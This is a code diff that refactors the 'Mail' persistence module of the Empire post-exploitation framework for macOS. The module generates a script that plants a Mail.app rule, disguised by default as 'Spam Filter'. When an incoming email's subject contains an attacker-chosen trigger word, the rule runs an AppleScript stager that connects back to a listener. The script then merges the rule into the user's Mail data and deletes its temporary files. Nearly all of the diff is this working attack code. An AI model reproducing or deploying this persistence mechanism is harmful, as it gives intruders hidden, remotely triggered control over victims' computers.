@@ -4,107 +4,21 @@ from builtins import object
 from time import time
 from random import choice
 from string import ascii_uppercase
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
+
+
 class Module(object):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> str:
 
-    def __init__(self, mainMenu, params=[]):
-
-        # metadata info about the module, not modified during runtime
-        self.info = {
-            # name for the module that will appear in module menus
-            'Name': 'Mail',
-
-            # list of one or more authors for the module
-            'Author': ['@n00py'],
-
-            # more verbose multi-line description of the module
-            'Description': ('Installs a mail rule that will execute an AppleScript stager when a trigger word is present in the Subject of an incoming mail.'),
-
-            'Software': '',
-
-            'Techniques': ['T1155'],
-
-            # True if the module needs to run in the background
-            'Background' : False,
-
-            # File extension to save the file as
-            'OutputExtension' : None,
-
-            # if the module needs administrative privileges
-            'NeedsAdmin' : False,
-
-            # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : False,
-
-            # the module language
-            'Language': 'python',
-
-            # the minimum language version needed
-            'MinLanguageVersion': '2.6',
-
-            # list of any references/other comments
-            'Comments': ['https://github.com/n00py/MailPersist']
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'Agent to execute module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'SafeChecks': {
-                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
-                'Required': True,
-                'Value': 'True'
-            },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'RuleName' : {
-                'Description'   :   'Name of the Rule.',
-                'Required'      :   True,
-                'Value'         :   'Spam Filter'
-            },
-            'Trigger' : {
-                'Description'   :   'The trigger word.',
-                'Required'      :   True,
-                'Value'         :   ''
-            }
-        }
-#
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        # During instantiation, any settable option parameters
-        #   are passed as an object set to the module and the
-        #   options dictionary is automatically set. This is mostly
-        #   in case options are passed on the command line
-        if params:
-            for param in params:
-                # parameter format is [Name, Value]
-                option, value = param
-                if option in self.options:
-                    self.options[option]['Value'] = value
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-
-        ruleName = self.options['RuleName']['Value']
-        trigger = self.options['Trigger']['Value']
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        safeChecks = self.options['SafeChecks']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
+        rule_name = params['RuleName']
+        trigger = params['Trigger']
+        listener_name = params['Listener']
+        user_agent = params['UserAgent']
+        safe_checks = params['SafeChecks']
+        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent, safeChecks=safe_checks)
         launcher = launcher.replace('"', '\\"')
         launcher = launcher.replace('"', '\\"')
         launcher = "do shell script \"%s\"" % (launcher)
@@ -113,12 +27,12 @@ class Module(object):
             return ''.join([choice(hex) for x in range(8)]) + "-" + ''.join(
                 [choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join(
                 [choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(12)])
-        CriterionUniqueId = UUID()
+        criterion_unique_id = UUID()
         RuleId = UUID()
-        TimeStamp = str(int(time()))[0:9]
-        SyncedRules = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
-        RulesActiveState = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
-        AppleScript = ''.join(choice(ascii_uppercase) for i in range(12)) + ".scpt"
+        time_stamp = str(int(time()))[0:9]
+        synced_rules = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
+        rules_active_state = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
+        apple_script = ''.join(choice(ascii_uppercase) for i in range(12)) + ".scpt"
         plist = '''<?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
         <plist version="1.0">
@@ -127,14 +41,14 @@ class Module(object):
         		<key>AllCriteriaMustBeSatisfied</key>
         		<string>NO</string>
         		<key>AppleScript</key>
-        		<string>''' + AppleScript + '''</string>
+        		<string>''' + apple_script + '''</string>
         		<key>AutoResponseType</key>
         		<integer>0</integer>
         		<key>Criteria</key>
         		<array>
         			<dict>
         				<key>CriterionUniqueId</key>
-        				<string>''' + CriterionUniqueId + '''</string>
+        				<string>''' + criterion_unique_id + '''</string>
         				<key>Expression</key>
         				<string>''' + str(trigger) + '''</string>
         				<key>Header</key>
@@ -154,7 +68,7 @@ class Module(object):
         		<key>RuleId</key>
         		<string>''' + RuleId + '''</string>
         		<key>RuleName</key>
-        		<string>''' + str(ruleName) + '''</string>
+        		<string>''' + str(rule_name) + '''</string>
         		<key>SendNotification</key>
         		<string>NO</string>
         		<key>ShouldCopyMessage</key>
@@ -162,7 +76,7 @@ class Module(object):
         		<key>ShouldTransferMessage</key>
         		<string>NO</string>
         		<key>TimeStamp</key>
-        		<integer>''' + TimeStamp + '''</integer>
+        		<integer>''' + time_stamp + '''</integer>
         		<key>Version</key>
         		<integer>1</integer>
         	</dict>
@@ -234,6 +148,6 @@ else:
 os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/" + version + "/MailData/RulesActiveState.plist")
 os.system("rm " + SyncedRules)
 os.system("rm " + RulesActiveState)
-        """ % (AppleScript, SyncedRules, RulesActiveState, plist, plist2, launcher)
+        """ % (apple_script, synced_rules, rules_active_state, plist, plist2, launcher)
 
         return script
